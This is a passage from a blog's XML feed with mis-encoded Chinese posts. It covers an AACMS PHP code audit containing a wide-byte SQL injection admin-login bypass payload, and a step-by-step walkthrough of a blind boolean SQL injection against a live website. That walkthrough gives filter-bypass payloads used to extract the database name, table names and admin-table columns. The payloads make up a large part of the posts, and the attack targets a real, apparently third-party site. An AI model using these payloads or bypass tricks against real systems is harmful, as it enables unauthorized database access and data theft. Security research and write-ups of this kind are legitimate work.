class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br><br><span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br><br><span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>dheader(ADMINSCRIPT);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;<br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç”¨æˆ·çš„å¯†ç è§£ä¸å‡ºæ¥æ—¶ï¼Œä¸Šé¢çš„å®½å­—èŠ‚æ³¨å…¥æ¼æ´å°±æ˜¾å¾—æ²¡å¤šå¤§ç”¨äº†ï¼Œæ‰€ä»¥ä¸€ä¸ªä¸‡èƒ½å¯†ç æ˜¯å¾ˆé‡è¦çš„ï¼Œè¿™é‡Œç”±äºæ²¡æœ‰å¤ç°æˆåŠŸï¼Œæ‰€ä»¥å°±è‡ªå·±æ‹ä¸€ä¸‹æ€è·¯å§ï¼Œä¸ºä¸‹æ¬¡ç¢°è§ç±»ä¼¼åšä¸ªå‡†å¤‡</p><p>é¦–å…ˆç¨‹åºæ ¹æ®<code>$username</code>å­—æ®µå»æ•°æ®åº“ä¸­æŸ¥å–å“åº”çš„è´¦å·ä¿¡æ¯</p><p>ç„¶åå¯¹è¾“å…¥çš„å¯†ç è¿›è¡Œä¸€ä¸ªåŠ ç›åŠ å¯†</p><p>æ¯”å¯¹å¯†ç åŒæ—¶åˆ¤æ–­è¯¥è´¦å·æ˜¯å¦ä¸ºç®¡ç†å‘˜</p><p>OKï¼Œç”±äºåœ¨æ ¹æ®<code>$username</code>å»æ•°æ®åº“æŸ¥è¯¢å¤„å­˜åœ¨sqlæ³¨å…¥ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨è”åˆæŸ¥è¯¢è¦†ç›–æ‰åŸæ¥çš„æŸ¥è¯¢æ•°æ®ï¼Œè®©æ•°æ®åº“è¿”å›æƒ³è¦çš„æ•°æ®</p><p>æ ¹æ®æ•°æ®åº“çš„å­—æ®µï¼Œå¯ä»¥è¿›è¡Œpayloadçš„æ„é€ </p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png"></p><p><code>&amp;admin_username=zzz%df&#39; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &amp;admin_password=3</code></p><p>å…¶ä¸­å­—æ®µä¸‰ä¸ºæ•°æ®åº“åŠ å¯†åçš„å¯†ç ï¼Œå­—æ®µäº”<code>groupid</code>å¿…é¡»ä¸º1ï¼Œå­—æ®µä¹<code>salt</code>ç”¨äºå­—æ®µä¸‰åŠ å¯†</p><p>æ•°æ®åº“æœ€ç»ˆæ‰§è¡Œè¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM pre_member WHERE username=&#x27;zzzé‹&#x27; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &#x27;<br></code></pre></td></tr></table></figure><p>ä»£å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œè¿”å›çš„ä¹Ÿæ˜¯æƒ³è¦çš„å€¼</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png"></p><p>ä½†å°±æ˜¯æ— æ³•æˆåŠŸå¤ç°ï¼ŒåŸå› ä»æœªå‘ç°ğŸ˜­</p><p>çœŸèœï¼Œå¤ç°éƒ½å¤ç°ä¸å‡ºæ¥ğŸ˜’</p><h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p><a href="https://www.freebuf.com/vuls/229981.html">https://www.freebuf.com/vuls/229981.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PHPä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å°ç ´ç«™çš„SQLç»•è¿‡</title>
    <link href="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/"/>
    <url>/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>è¿™ç¯‡æ–‡ç« ä¸­çš„ç«™ç‚¹æ˜¯ä»¥å‰å‘ç°çš„äº†ï¼Œæ¼æ´ä¹Ÿæ˜¯ä»¥å‰æçš„ï¼Œä½†æ˜¯æœ€è¿‘æˆ‘è§‰ç€æˆ‘å¤§å“¥éœ€è¦æ‰¾ç‚¹ä¸œè¥¿ç»ƒç»ƒæ‰‹ï¼Œç„¶åå°±æŠŠè¿™ä¸ªä¸¢ç»™äº†å¤§å“¥ï¼Œç»“æœå¤§å“¥æ€»æ˜¯åœ¨æ‰¾ç†ç”±æ¨è„±ï¼ˆå¤§å“¥ä¹Ÿæƒ³æï¼Œä½†æ€»æ˜¯æ‰¾å€Ÿå£è¯´æ²¡æ—¶é—´ï¼‰ï¼Œç„¶åæˆ‘è·Ÿå¤§å“¥è¯´ï¼Œä½ å†ä¸ææˆ‘å°±ç›´æ¥æŠŠæ€è·¯è¿‡ç¨‹å‘ç»™ä½ ï¼Œæ¶å¿ƒå¤§å“¥ä¸€æ‰‹ã€‚æ²¡é”™ï¼Œè¿™ç¯‡æ–‡ç« å°±æ˜¯æ‹¿æ¥æ¶å¿ƒæˆ‘å¤§å“¥ä¸€æ‰‹çš„</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/1.png"></p><h4 id="æ³¨å…¥è¿‡ç¨‹"><a href="#æ³¨å…¥è¿‡ç¨‹" class="headerlink" title="æ³¨å…¥è¿‡ç¨‹"></a>æ³¨å…¥è¿‡ç¨‹</h4><p>è¿™ä¸ªç«™ç‚¹å¥½åƒæ˜¯è¡¥å¤©å…¬ç›Šé‡Œé¢çš„ä¸€ä¸ªï¼Œè‡³äºæ³¨å…¥ç‚¹æ˜¯æ€ä¹ˆæ‰¾åˆ°çš„å°±è®°ä¸æ¸…äº†ï¼Œæ‰€ä»¥å°±ç›´æ¥å¼€æ</p><p><code>and 1=1</code>ï¼Œ<code>and 1=2</code>,å±¡è¯•ä¸çˆ½,ç»“æœGGï¼Œç›´æ¥ç™½å±å•¥éƒ½ä¸æ˜¾ç¤ºå¥½å§</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/2.png"></p><p>andä¸è¡Œï¼Œé‚£å°±è¯•ä¸€ä¸‹orï¼Œå¥½å®¶ä¼™ï¼Œä¹Ÿæ˜¯ä¸è¡Œï¼Œä½†æ˜¯è¯•ä¸€ä¸‹ç›´æ¥<code>video_id=0 or 1</code>ï¼Œå› ä¸º1ä¹Ÿæ˜¯ä»£è¡¨TRUEï¼Œä¸é”™ï¼Œä¸é”™  å¯è¡Œï¼Œæ³¨æ„æ­¤æ—¶é¡µé¢åœ¨ä¼šåŠ¡å°ç¨‹åºå¤„åå›äº†å¾ˆå¤šå°è§†é¢‘</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/3.png"></p><p>å†è¯•ä¸€ä¸‹<code>video_id=0 or 0</code>ï¼Œå°è§†é¢‘æ²¡äº†ï¼Œè¿™åŸºæœ¬å¯ä»¥ç¡®å®šå¸ƒå°”ç›²æ³¨æ²¡è·‘äº†</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/4.png"></p><p>åé¢å‘ç°ç›´æ¥<code>video_id=0</code>å’Œ<code>video_id=1</code>ä¹Ÿæ˜¯èƒ½å‘ç°é¡µé¢å›æ˜¾ä¸ä¸€æ ·çš„ï¼Œé‚£è¿™é‡Œè‚¯å®šè¦è¯•ä¸€ä¸‹æŠ¥é”™</p><p>æ—¢ç„¶æ˜¯å¸ƒå°”ç›²æ³¨ï¼Œé‚£è‚¯å®šè¦å…ˆåˆ¤æ–­ä¸€ä¸‹database()çš„é•¿åº¦ï¼Œä¸è¿‡è¿™æ˜¯é—®é¢˜å°±æ¥äº†ï¼Œä¸€èˆ¬å¸ƒå°”ç›²æ³¨è‚¯å®šä¼˜å…ˆç”¨ifï¼Œ</p><p>ç›´æ¥å°è¯•<code>video_id=0 or if(length(database())=10,1,0)</code></p><p>ç›´æ¥æŠ¥é”™</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/5.png"></p><p>å¥½å®¶ä¼™ï¼Œç›´æ¥æŠ¥é”™ï¼Œæ˜¾ç¤º<code>())=1010</code>ä½ç½®é”™è¯¯ï¼Œè€Œè¾“å…¥çš„æ˜¯<code>if(length(database())=10,1,0)</code>,èƒ½å¤Ÿåˆ¤æ–­é€—å· <strong>,</strong> é€—å·æ— äº†ï¼Œè€Œifå¿…é¡»è¦ä½¿ç”¨é€—å·(åœ¨æˆ‘çš„è®¤çŸ¥ä¸­æ˜¯å¿…é¡»è¦ä½¿ç”¨é€—å·çš„)ï¼Œä½œä¸ºèœé¸¡çš„æˆ‘ï¼Œä¸€æ—¶é—´ä¸çŸ¥é“è¯¥å¦‚ä½•äº†ã€‚ä½†è¿™é‡Œéœ€è¦è®°ä¸€ä¸‹ï¼Œé€—å·è¢«è¿‡æ»¤æ‰äº†ï¼Œåé¢ç»•è¿‡è¿‡ç¨‹ä¸­ä¼šç”¨åˆ°</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/6.png"></p><p>æ‹¿å‡ºæˆ‘çš„MySQLæ‰‹å†Œï¼Œæ‰“å¼€ï¼Œç¿»æ‰¾ï¼Œå‘ç°æˆ‘çœŸèœï¼Œèƒ½å°±åªæœ‰ä¸€ä¸ªifå˜›ï¼Ÿï¼Ÿï¼Ÿè‚¯å®šè¿˜æœ‰å…¶ä»–çš„åˆ¤æ–­è¯­å¥ï¼Œæœä¸å…¶ç„¶ï¼Œæœ‰<code>when</code>,è€Œä¸”<code>when</code>è¿˜æ²¡æœ‰é€—å·ï¼Œå®Œç¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># whenè¯­å¥ç”¨æ³• conditionæ˜¯ä¸€ä¸ªè¿”å›å¸ƒå°”ç±»å‹çš„è¡¨è¾¾å¼ï¼Œå¦‚æœè¡¨è¾¾å¼è¿”å›trueï¼Œåˆ™æ•´ä¸ªå‡½æ•°è¿”å›ç›¸åº”resultçš„å€¼ï¼Œå¦‚æœè¡¨è¾¾å¼çš†ä¸ºfalseï¼Œåˆ™è¿”å›ElSEåresultçš„å€¼ï¼Œå¦‚æœçœç•¥äº†ELSEå­å¥ï¼Œåˆ™è¿”å›NULLã€‚<br>CASE WHEN condition THEN result<br>[WHEN...THEN...]<br>ELSE result<br>END<br></code></pre></td></tr></table></figure><p>å°è¯•ä¸€ä¸‹<code>video_id=0 or (case when 1=2 then 1 else 0 end)</code>å’Œ<code>video_id=0 or (case when 1=1 then 1 else 0 end)</code></p><p>å‘ç°é¡µé¢å·²ç»ä¸æŠ¥é”™äº†ï¼Œå¹¶ä¸”è¿”å›å†…å®¹ä¹Ÿä¸ç›¸åŒï¼Œè¿™æ ·å¯ä»¥ç»§ç»­å¾€ä¸‹äº†</p><p>å†è¯•ä¸€ä¸‹<code>video_id=0 or (case when length(database())=10 then 1 else 0 end)</code>,å¥½äº†ï¼Œåˆä¸è¡Œ</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/7.png"></p><p>çœ‹æ¥è¿™é‡Œä¸æ˜¯<code>length()</code>ï¼Œå°±æ˜¯<code>database()</code>çš„é—®é¢˜äº†</p><p>å…ˆè¯•ä¸€ä¸‹<code>length()</code>èƒ½ä¸èƒ½ä½¿ç”¨ï¼Œ<code>video_id=0 or (case when length(123)=3 then 1 else 0 end)</code>ï¼Œ</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/8.png"></p><p>å‘ç°èƒ½ç”¨ï¼Œé‚£è‚¯å®šæ˜¯å¯¹<code>database()</code>è¿›è¡Œäº†æ£€æµ‹è¿‡æ»¤</p><p>é‚£è¾“å…¥<code>video_id=0 or (case when length(zzzdataqqqbasexxx())=3 then 1 else 0 end)</code>æ¥è¯•ä¸€ä¸‹ï¼Œå¥½å®¶ä¼™è¯¥æœ‰çš„åŸºæœ¬æ²¡æœ‰ï¼Œä¸è¯¥æœ‰çš„éƒ½æœ‰ï¼Œä½†æ³¨æ„<code>database()</code>ä¸­çš„<code>base</code>è¢«è¿‡æ»¤æ‰äº†.ï¼ˆå…¶å®è¿™é‡Œå·²ç»å¾—åˆ°<code>database()</code>çš„å€¼äº†ï¼Œä½†è¿™é‡Œæ˜¯è®²ç»•è¿‡ï¼Œæ‰€ä»¥ç»§ç»­ç»•ï¼‰</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/9.png"></p><p><code>base</code>æ— äº†ï¼Œé‚£æˆ‘å†™ä¸¤ä¸ªå¥½å§ï¼Œ<code>video_id=0 or (case when length(datababasese())=8 then 1 else 0 end)</code></p><p>æˆåŠŸï¼Œè¿™å°±å¾ˆniceäº†ï¼Œå¾—åˆ°<code>database()</code>çš„é•¿åº¦ä¸º8</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/10.png"></p><p>å¼€å§‹çˆ†æ•°æ®åº“åï¼Œè¿™é‡Œå…ˆå°è¯•ä¸€ä¸‹èƒ½å¦ä½¿ç”¨å¼•å·ï¼š<code>video_id=0 or (case when length(&#39;123&#39;)=3 then 1 else 0 end)</code></p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/11.png"></p><p>ç®—äº†ï¼Œè¿˜æ˜¯ä¸ç”¨å¼•å·äº†å§ï¼Œç”¨<code>ascii()</code>è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è¦è®°ä½çš„æ˜¯è¿™é‡Œä¸èƒ½ä½¿ç”¨é€—å·ï¼Œå¼•å·</p><p>è€Œåˆšå¥½<code>substring()</code>æœ‰ä¸€ç§ä¸ç”¨å¼•å·çš„å½¢å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">substring(string from position for length)<br># å‚æ•°stringæŒ‡çš„æ˜¯éœ€è¦æˆªå–çš„åŸå­—ç¬¦ä¸²<br># æ•°positionæŒ‡çš„æ˜¯ä»å“ªä¸ªä½ç½®å¼€å§‹æˆªå–å­å­—ç¬¦ä¸²,è‹¥positionä¸ºè´Ÿæ•°åˆ™ä»å³å¾€å·¦å¼€å§‹æ•°ä½ç½®ã€‚<br># å‚æ•°lengthæŒ‡çš„æ˜¯éœ€è¦æˆªå–çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œå¦‚æœä¸å†™ï¼Œåˆ™é»˜è®¤æˆªå–ä»positionå¼€å§‹åˆ°æœ€åä¸€ä½çš„æ‰€æœ‰å­—ç¬¦ã€‚<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä¸€ä½ä¸€ä½åˆ¤æ–­çš„ï¼Œæ‰€ä»¥å¯ä»¥å¿½ç•¥forï¼Œæ„é€ payloadå¦‚ä¸‹</p><p><code>video_id=0 or (case when ascii(substring(datababasese() from -1))=121 then 1 else 0 end)</code></p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/12.png"></p><p>æˆåŠŸè·å–åˆ°æ•°æ®åº“åçš„æœ€åä¸€ä½æ˜¯<strong>y</strong>ï¼Œç„¶åå°±ä¸€æ­¥æ­¥è·å–å°±å¯ä»¥äº†ï¼Œæœ€ç»ˆå¾—åˆ°æ•°æ®åº“åä¸ºï¼š<strong>news_wsy</strong>ï¼Œä¸ä¸Šé¢çœ‹åˆ°çš„ä¸€æ ·</p><p>æ¥ä¸‹æ¥å°±æ˜¯è·å–è¡¨åäº†ï¼Œæ­£å¸¸æƒ…å†µä¸‹ç›´æ¥æŠŠ<code>datababasese()</code>æ¢æˆ<code>(select table_name from information_schema.tables where table_schema=&quot;æ•°æ®åº“å&quot;)</code>å°±å¯ä»¥äº†ï¼Œä½†è¿™é‡Œè‚¯å®šä¸æ­£å¸¸0.0</p><p>ä¸èƒ½æœ‰å¼•å·ï¼šæ‰€ä»¥å¯ä»¥åˆ©ç”¨MySQLçš„ç‰¹æ€§å°†åº“åä½ç½®æ›´æ”¹ä¸º16è¿›åˆ¶å½¢å¼ï¼š0x6E6577735F777379</p><p><code>video_id=0 or not (case when substring((select table_name from information_schema.tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else0 end)</code>,å°è¯•ä¸€ä¸‹è¿™ä¸ªpayload</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/13.png"></p><p>GG,ç›´æ¥å‚æ•°ä¸åˆæ³•ï¼Œå‚æ•°ä¸åˆæ³•ï¼Œé‚£æµ‹ä¸€ä¸‹å“ªäº›å‚æ•°ä¸åˆæ³•</p><p>å…ˆè¯•ä¸€ä¸‹selectåˆä¸åˆæ³•ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯å¾ˆå¤šè¿‡æ»¤è§„åˆ™ä¸­éƒ½ä¼šç¦ç”¨çš„</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/14.png"></p><p>æœç„¶ä¸åˆæ³•ï¼Œåƒè¿™ç§å…³é”®å­—ä¸€èˆ¬å¯ä»¥ä½¿ç”¨å†…è”æ³¨é‡Šã€å…³é”®å­—æ›¿ä»£ã€å¤§å°å†™ç­‰ç»•è¿‡æ–¹å¼ï¼Œä½†è¿™é‡Œï¼Œè¿˜å¯ä»¥ä½¿ç”¨é€—å·ï¼Œåœ¨å‰é¢çš„ç»•è¿‡ä¸­å‘ç°é€—å·æ˜¯ä¼šè¢«è¿‡æ»¤æ‰çš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å°è¯•ä¸€ä¸‹åœ¨selectä¸­åŠ ä¸ªé€—å·ï¼Œå¦‚æœæœåŠ¡ç«¯æ˜¯å…ˆè¿›è¡Œselectçš„æ£€éªŒï¼Œå†åˆ é™¤é€—å·ï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ˜¯å¯ä»¥è¡Œçš„ï¼Œå°è¯•ä¹‹åï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸè¿‡æ¥</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/15.png"></p><p>ç„¶åç»§ç»­å¾€ä¸‹å°è¯•ï¼Œä¸€ä¸ªå•è¯ä¸€ä¸ªå•è¯çš„è¿›è¡Œï¼Œçœ‹çœ‹æœåŠ¡ç«¯è¿˜æ£€æµ‹äº†å“ªäº›ï¼Œ</p><p>å†™åˆ°<code>video_id=0 or not (case when substring((sel,ect table_name from information_schema.tables)from 1 for 1)=0x61 then 1 else 0 end)</code>è¿™é‡Œæ—¶å‘ç°åˆä¸è¡Œäº†ï¼Œåˆæç¤ºå‚æ•°ä¸åˆæ³•äº†</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/16.png"></p><p>é‚£åŸºæœ¬ä¸Šå°±æ˜¯<code>information_schema.tables</code>çš„é—®é¢˜ï¼Œç»æµ‹è¯•<code>information_schema</code>å’Œ<code>tables</code>å•ç‹¬å­˜åœ¨æ—¶éƒ½æ²¡æœ‰é—®é¢˜ï¼Œé‚£ä¹ˆä¸€å®šæ˜¯<code>information_schema.tables</code>åŒæ—¶å­˜åœ¨ä¼šè¢«è§„åˆ™åŒ¹é…åˆ°ï¼Œé‚£ä¹ˆè¿™é‡Œå¯ä»¥æ›´æ”¹æˆ<code>informa,tion_sch,ema.tab,les</code>æˆ–è€…<code>information_schema . tables</code>(è¿™ç§å½¢å¼æ˜¯åœ¨MySQLå‘½ä»¤è¡Œä¸­æµ‹è¯•å‘ç°)ï¼Œå°†payloadæ›´æ”¹ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><p><code>video_id=0 or not (case when substring((sel,ect group_concat(table_name)from information_schema . tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else 0 end)</code></p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/17.png"></p><p>æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¹ççš„çˆ†è¡¨ï¼Œè¿™é‡Œè·å–äº†å‰å››ä¸ªè¡¨çš„ï¼šaddgunang,admin,announcement_listï¼Œè·å–è¡¨ä¹‹åå°±æ˜¯çˆ†å­—æ®µäº†ï¼Œè¿™é‡Œè·Ÿçˆ†è¡¨æ²¡æœ‰å¤ªå¤šåŒºåˆ«ï¼Œæ‰€ä»¥ç›´æ¥é™„ä¸Špayload:</p><p><code>video_id=0 or not(case when substring((sel,ect group_concat(column_name)from(information_schema . columns)where table_name=0x61646D696E)from 1 for 1)=0x61 then 1 else 0 end)</code></p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/18.png"></p><p>æˆåŠŸï¼Œè·å–æ•°æ®å¤„åŸºæœ¬ä¸Šå°±æ²¡æœ‰ä»€ä¹ˆç»•è¿‡çš„å†…å®¹äº†ï¼Œæ‰€ä»¥å†™åˆ°è¿™é‡Œå°±å·®ä¸å¤šäº†</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å…¶å®è¿™ä¸ªæ³¨å…¥ç‚¹æ˜¯å¾ˆç®€å•çš„ï¼Œå°¤å…¶æ˜¯åœ¨å‘ç°æœåŠ¡ç«¯å°†é€—å·è¿‡æ»¤æ‰ä¹‹åï¼Œå¹¶ä¸”è¿™ä¸ªè¿‡æ»¤é€—å·æ˜¯åœ¨æ£€æµ‹ä¹‹åè¿›è¡Œçš„ï¼Œå‘ç°è¿™ä¸ªä¹‹åï¼Œåé¢æ³¨å…¥åŸºæœ¬ä¸Šæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œé‡åˆ°å…³é”®å­—æ£€æµ‹å°±åœ¨å…³é”®å­—ä¸­åŠ ä¸ªé€—å·ï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡æ£€æµ‹ï¼›å¦å¤–å°±æ˜¯MySQLä¸­ä¸€äº›å¯ä»¥ç›¸äº’æ›¿æ¢çš„å‡½æ•°ï¼ŒåŠ›æ¨MySQLæ‰‹å†Œï¼Œçœ‹çœ‹è¿™ä¸ªæ‰¾ä¸€æ‰¾ï¼Œæœ‰æ—¶å€™æ‰¾å®˜æ–¹æ–‡æ¡£æ¯”ç™¾åº¦çš„å¿«ï¼ŒåŸºæœ¬ä¸Šå°±è¿™ä¸ªæ ·å­äº†ã€‚å¦å¤–æ–‡ç« ä¸­æœ‰ä¸€äº›Payloadæ˜¯ç›´æ¥å¤åˆ¶çš„ä»¥å‰æ³¨å…¥æ—¶ç•™ä¸‹çš„è®°å½•ï¼Œæ‰€ä»¥å¯èƒ½æœ‰æ—¶å€™æ˜¯<code>0 or (xxx)</code>ï¼Œæœ‰æ—¶å€™æ˜¯<code>0 or not(xxx)</code>ï¼Œä¸è¿‡è¿™äº›éƒ½å·®ä¸å¤šï¼Œæ²¡å¤šå¤§å½±å“ã€‚è¿™ä¸ªä½ç½®ä¸ªäººæ„Ÿè§‰å¯¹ç»ƒä¹ ç»•è¿‡æ€è·¯æœ‰ä¸€å®šå¸®åŠ©ï¼Œæ‰€ä»¥è®°å½•ä¸‹æ¥ã€‚ççˆ±ç”Ÿå‘½ï¼Œä¸è¦æ‰’æ‹‰æ•°æ®ï¼ŒéªŒè¯å­˜åœ¨å°±å¥½ã€‚</p><p>æœ€åï¼Œè¯¥å»å¹²æ­£äº‹äº†</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/19.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ç”¨æ¥æ¶å¿ƒäººçš„</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘</title>
    <link href="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&amp;%E9%A2%84%E7%BC%96%E8%AF%91/"/>
    <url>/2022/01/30/SQL%E6%B3%A8%E5%85%A5&amp;%E9%A2%84%E7%BC%96%E8%AF%91/</url>
    
